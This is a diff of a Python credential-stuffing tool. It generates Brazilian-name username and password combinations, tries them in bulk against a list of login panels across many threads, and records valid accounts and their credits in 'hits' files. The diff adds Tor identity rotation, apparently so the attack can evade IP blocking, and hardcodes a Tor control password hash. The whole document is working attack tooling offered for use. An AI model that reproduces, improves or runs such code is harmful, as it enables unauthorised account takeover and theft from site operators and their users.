@@ -10,6 +10,8 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from colorama import Fore, Style, init
 from faker import Faker
 import random
+from stem import Signal
+from stem.control import Controller
 
 # Initialize colorama
 init()
@@ -17,7 +19,7 @@ init()
 # Global settings
 THREADS_PER_SITE = 5
 SIMULTANEOUS_SITES = 80
-BATCH_SIZE = 1000  # Logins per batch
+BATCH_SIZE = 1000 # Logins per batch
 
 # SSL Configuration
 requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
@@ -51,8 +53,7 @@ class LoginGenerator:
                 nome = random.choice([self.faker_pt.first_name(), self.faker_br.first_name()])
                 if len(nome.split()[0]) >= 6:
                     nome = nome.split()[0]
-                    break
-
+                break
             numero = random.randint(0, 99)
             usuario = f"{nome}{numero:02d}"
             
@@ -72,7 +73,6 @@ class LoginGenerator:
                         if combo not in self.used_combinations and len(logins) < batch_size:
                             self.used_combinations.add(combo)
                             logins.append(combo)
-
             senhas = [
                 f"{numero:02d}{nome.capitalize()}",
                 f"{nome.capitalize()}{numero:02d}",
@@ -85,14 +85,12 @@ class LoginGenerator:
                 f"{numero:02d}{nome.capitalize()}",
                 f"{nome.capitalize()}"
             ]
-
             for senha in senhas:
                 combo = (usuario, senha)
                 with self.lock:
                     if combo not in self.used_combinations and len(logins) < batch_size:
                         self.used_combinations.add(combo)
                         logins.append(combo)
-
         return logins
 
 class LoginChecker:
@@ -131,35 +129,32 @@ class LoginChecker:
     def save_valid_login(self, nhost, user, password, credits):
         base_path = "/home/_Paineis/hits"
         os.makedirs(base_path, exist_ok=True)
-
         with open(f"{base_path}/Sr.Hell@{nhost}.txt", "a") as f:
             f.write(f"\n╼╾ Sr. Hell ╼╾\n")
-            f.write(f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾\n")
-            f.write(f"𝐔𝐒𝐄𝐑: {user}\n")
-            f.write(f"𝐏𝐀𝐒𝐒: {password}\n")
-            f.write(f"╼╾ 𝐢𝐧𝐟𝐨 ╼╾\n")
-            f.write(f"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: {credits}\n")
+            f.write(f"╼╾ Universal 𝔏𝔦𝔤𝔥𝔱 ╼╾\n")
+            f.write(f"𝔏𝔬𝔤𝔦𝔫: {user}\n")
+            f.write(f"𝔓𝔞𝔰𝔰: {password}\n")
+            f.write(f"╼╾ 𝔏𝔦𝔤𝔥𝔱 ╼╾\n")
+            f.write(f"𝔠𝔯𝔢𝔡𝔦𝔱𝔰: {credits}\n")
             f.write(f"╼╼╼╼╼╼╼╼╼╼╼\n")
             f.write(f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾\n")
-
         with open(f"{base_path}/Sr.Hell@COMBO(U&P).txt", "a") as f:
             f.write(f"{user}:{password}\n")
 
     def print_valid_login(self, nhost, user, password, credits):
         print(f"{Fore.GREEN}\n╼╾ Sr. Hell ╼╾")
-        print(f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾")
-        print(f"𝐒𝐈𝐓𝐄: {nhost}")
-        print(f"𝐔𝐒𝐄𝐑: {user}")
-        print(f"𝐏𝐀𝐒𝐒: {password}")
-        print(f"╼╾ 𝐢𝐧𝐟𝐨 ╼╾")
-        print(f"𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒: {credits}")
+        print(f"╼╾ Universal 𝔏𝔦𝔤𝔥𝔱 ╼╾")
+        print(f"𝔏𝔬𝔤𝔦𝔫: {nhost}")
+        print(f"𝔏𝔬𝔤𝔦𝔫: {user}")
+        print(f"𝔓𝔞𝔰𝔰: {password}")
+        print(f"╼╾ 𝔏𝔦𝔤𝔥𝔱 ╼╾")
+        print(f"𝔠𝔯𝔢𝔡𝔦𝔱𝔰: {credits}")
         print(f"╼╼╼╼╼╼╼╼╼╼╼")
         print(f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾{Style.RESET_ALL}")
 
     def check_login(self, nhost, user, password):
         with self.lock:
             self.total_checks += 1
-
         cookies = self.login(nhost, user, password)
         if cookies:
             dashboard_data = self.get_dashboard_data(nhost, cookies)
@@ -169,7 +164,7 @@ class LoginChecker:
                 
                 with self.lock:
                     self.success_count += 1
-                    
+                
                 self.save_valid_login(nhost, user, password, credits)
                 self.print_valid_login(nhost, user, password, credits)
                 print(f"{Fore.GREEN}Total de logins válidos encontrados: {self.success_count}")
@@ -209,14 +204,13 @@ def process_site(nhost, login_generator, checker):
             print(f"{Fore.CYAN}Verificando lote #{batch_count} ({BATCH_SIZE} logins) em {nhost}")
             print(f"{Fore.CYAN}Total de verificações: {checker.total_checks}")
             print(f"{Fore.GREEN}Total de sucessos: {checker.success_count}")
-
             threads = []
             for _ in range(THREADS_PER_SITE):
                 t = threading.Thread(target=worker, args=(login_queue, nhost, checker, worker_done_event))
                 t.daemon = True
                 t.start()
                 threads.append(t)
-
+            
             # Wait for all tasks to be processed
             login_queue.join()
             
@@ -226,56 +220,63 @@ def process_site(nhost, login_generator, checker):
                 t.join()
             
             print(f"{Fore.GREEN}Lote #{batch_count} concluído para {nhost}")
-            time.sleep(1)
-
+            time.sleep(60)  # Espera 1 minuto antes de renovar a conexão
+            renew_connection()  # Renova a conexão Tor
     except KeyboardInterrupt:
         print(f"{Fore.YELLOW}Interrupção detectada. Finalizando verificação de {nhost}")
         print(f"{Fore.CYAN}Total de verificações em {nhost}: {checker.total_checks}")
         print(f"{Fore.GREEN}Total de sucessos em {nhost}: {checker.success_count}")
 
+def renew_connection():
+    with Controller.from_port(port=9051) as controller:
+        controller.authenticate(password='16:E65EEE7F874CBDC06010C42A0C01D1F1A1763F4770C72949E63C95DE0B')  # Substitua 'your_password' pela senha do Tor
+        controller.signal(Signal.NEWNYM)
+
 def main():
     ascii_art = """\033[93m
-   _  _____  ___   _  ________     __  ___  __
-  / |/ / _ \/ _ | / |/ / __/ /    / / / / |/ /
- /    / ___/ __ |/    / _// /__  / /_/ /    / 
-/_/|_/_/  /_/ |_/_/|_/___/____/  \____/_/|_/  
-    """
+ _ _____ ___ _ ________ __ ___ __
+ / 
+/ / _ \/ _ 
+ / 
+/ / __/ / / / / / 
+/ /
+ / / ___/ __ 
+/ / _// /__ / /_/ / / 
+/_/
+_/_/ /_/ 
+_/_/
+_/___/____/ \____/_/
+_/ 
+ """
     print(ascii_art)
-
     try:
         with open("/home/_Paineis/site.txt", "r") as f:
             sites = [site.strip() for site in f.readlines() if site.strip()]
     except FileNotFoundError:
         print(f"{Fore.RED}Arquivo site.txt não encontrado!")
         return
-
     if not sites:
         print(f"{Fore.RED}Nenhum site encontrado para verificar!")
         return
-
     print(f"{Fore.CYAN}Sites a serem verificados: {len(sites)}")
     print(f"{Fore.CYAN}Threads por site: {THREADS_PER_SITE}")
     print(f"{Fore.CYAN}Sites simultâneos: {SIMULTANEOUS_SITES}")
     print(f"{Fore.CYAN}Tamanho do lote de logins: {BATCH_SIZE}")
-
     login_generator = LoginGenerator()
     checker = LoginChecker()
-
     try:
         site_threads = []
         for site in sites:
             while len([t for t in site_threads if t.is_alive()]) >= SIMULTANEOUS_SITES:
                 time.sleep(1)
-                site_threads = [t for t in site_threads if t.is_alive()]
+            site_threads = [t for t in site_threads if t.is_alive()]
             
             t = threading.Thread(target=process_site, args=(site, login_generator, checker))
             t.daemon = True
             t.start()
             site_threads.append(t)
-
         for thread in site_threads:
             thread.join()
-
     except KeyboardInterrupt:
         print(f"{Fore.YELLOW}\nPrograma interrompido pelo usuário.")
         sys.exit(0)
